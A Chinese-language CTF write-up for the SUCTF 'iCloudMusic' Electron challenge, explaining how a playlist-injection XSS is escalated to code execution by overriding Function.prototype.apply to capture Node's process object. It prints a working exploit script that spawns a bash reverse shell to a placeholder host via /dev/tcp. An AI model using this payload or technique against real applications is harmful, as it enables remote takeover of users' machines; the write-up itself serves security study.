# SUCTF iCloudMusic

## 搭建方式

* 进入dockers目录，运行`docker-compose up -d` 
* 进入iCloudMusic, 运行`npm install && npm start`

## Writeup

第一步的XSS不难，js_to_run中直接将歌单信息拼接到js中，引号+大括号逃逸即可。

拿到XSS怎样转化为RCE则考察怎样通过覆盖js原生函数来泄漏preload.js运行的node环境中的一些变量/函数等，这里有两种方法

* 思路1 暴力重写js所有原生函数
以Function.prototype.apply为例

```js
Function.prototype.apply2=Function.prototype.apply;
Function.prototype.apply=function(...args){
    for(var i in args)
        if(args[i])
        console.log(args[i].toString());
    return this.apply2(...args);
}
```

进入view的devtool,执行这个函数后，尝试执行request.get一个url，可以在console中找到`process`.因此便可以将我们的覆盖脚本改写为：
```js
Function.prototype.apply2=Function.prototype.apply;
Function.prototype.apply=function(...args){
    if(args[0]!=null && args[0]!=undefined && args[0].env!=undefined){
        Function.prototype.apply=Function.prototype.apply2;
        args[0].mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/XXXXXX/8080 0>&1"');
        }
        return this.apply2(...args)
}
request.get('http://www.baidu.com/',null)
```

* 思路2 白盒审计

request库/http库/其他很多node库都有可能调用process相关的函数，其中process下有这样一个函数`nextTick`
```js
ƒ (...args) {
            process.activateUvLoop();
            return func.apply(this, args);
        }
```
可以看到process.nextTick中调用了func.apply,即Function.prototype.apply,且参数this正是`process`本身。
在http库中处理socket请求的一个关键函数即调用了这个函数
```js
ClientRequest.prototype.onSocket = function onSocket(socket) {
  process.nextTick(onSocketNT, this, socket);
};
```
request库处理请求都使用http库，且request库本身也多次调用了这个函数
```js
var defer = typeof setImmediate === 'undefined'
  ? process.nextTick
  : setImmediate

```
知道这一点我们便可以直接给出我们同上的利用脚本。


